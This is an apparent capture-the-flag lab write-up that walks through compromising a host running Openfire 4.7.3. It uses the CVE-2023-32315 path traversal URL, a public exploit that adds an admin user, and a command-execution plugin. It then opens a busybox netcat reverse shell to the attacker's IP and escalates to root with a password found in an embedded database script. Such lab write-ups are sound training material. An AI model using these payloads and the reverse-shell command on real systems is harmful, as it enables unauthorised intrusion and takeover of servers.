Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.182.96 -p 22,9090,9091 returns the output shown above. It seems like a web application (HTTP) is running on port 9090, and another web application (HTTPs) application on port 9091. Time to check these applications further.

Enumeration

Port 9091: Openfire 4.7.3 (HTTPs)

The application Openfire 4.7.3 seems to be operating on this port as shown in the image above. This application is running on HTTPs sockets. I tried to login using default credentials such as admin:admin, admin:root, root:admin, but I had no luck. I am guessing the application on port 9090 is the same application, but on HTTP instead of HTTPs.

Port 9090: Openfire 4.7.3 (HTTP)

The application Openfire 4.7.3 seems to be operating on this port too, but with HTTP sockets instead of HTTPs. Since I have the application name and version, time to check for any vulnerabilities.


Doing a Google search for Openfire 4.7.3 vulnerabilities, I came across the technical website shown in the image above. Apparently all versions of Openfire starting from 3.10.0 are vulnerable to path traversal attack via the setup environment. This basically allows an unauthenticated user to access the Openfire Admin Console reversed for administrator users. Out in the wild, this vulnerability is exploited to create a new admin user that will be used to upload a Openfire management plugin weaponised with java native payload that triggers an Remote Code Execution (RCE) on the backend server. This vulnerability has the CVE ID of CVE-2023-32315.


When searching for any public exploits for this vulnerability, I came across the Github repository shown in the image above. The code for this exploit is accessible from here. This exploit adds a new administrator user on the application while unauthenticated. I downloaded this exploit on my machine. Time to test it.

Exploitation

Owning the Openfire 4.7.3 via Path Traversal (CVE-2023-32315)

Before running the exploit, I checked to see if the application is vulnerable first. To do this, I browsed to http://192.168.182.96:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp and got a hit as shown in the image above. I was able to successfully perform path traversal attack. Time to exploit this vulnerability.


To run the exploit, I ran the command python3 exp.py -u http://192.168.182.96:9090 as shown in the image above. And bingo. The exploit successfully created a new administrator user with the credentials hugme:HugmeNOW. Time to check if I can login now.


And it worked. Now I can access the Openfire application as the user hugme with administrator privileges created by the exploit, as shown in the image above. Although I have access, I now need to obtain code execution on the server. To accomplish this, the plugin Openfire-management-tool- can be uploaded as mentioned on the technical article about the vulnerability. This plugin can be found here.


I downloaded the plugin and uploaded it on the server, as shown in the image above. This can be done by pressing the Plugins tab and Upload Plugin section. Now the plugin is uploaded, time to perform code exeuction.


I browsed to Server first. Then Server Settings. Afterwards, I pressed the Management Tool button as shown in the image above. Then at the bottom of the screen, it informed me to enter the password which is 123 by default for this plugin.


And then I changed the functionality of the plugin to system command as shown in the image above. Time to perform remote command execution now.


I ran the command ifconfig on the target machine using the plugin, and obtained the result shown in the image above. Time to obtain a reverse shell connection now. I started a listener on my machine at port 8443. I ran the command whereis busybox using the command execution plugin and got the location. It seems like the target machine has this binary installed which I can use to obtain a reverse shell connection.


After starting a listener on my machine at port 8443. Then using the command execution plugin, I deployed the busybox reverse shell busybox nc 192.168.45.206 8443 -e /bin/bash. And I instantly obtained a reverse shell connection on my machine at port 8443. Then I upgraded my shell to an interactive tty shell using the command python3 -c 'import pty; pty.spawn("/bin/bash");'. Now I have a foothold on the target machine.

Privilege Escalation

Vertical Privilege Escalation: User openfire to User root via Hardcoded Sensitive Password of root


After obtaining a foothold, I began with manual enumeration. I decided to check out the embedded-db directory over at /usr/share/openfire/. I notice the openfire.script file as shown in the image above. There are two passwords inside this script: OpenFireAtEveryone and EOAJUe2Sqdlfqjk. The second password looks like it belongs to the user root, based on the smtp.username which is root.


Using su root and the password OpenFireAtEveryone, I successfully changed to this user root as shown in the image above. Now I have a root shell on the target machine. The PE vector was all manual enumeration and it took me some time :)
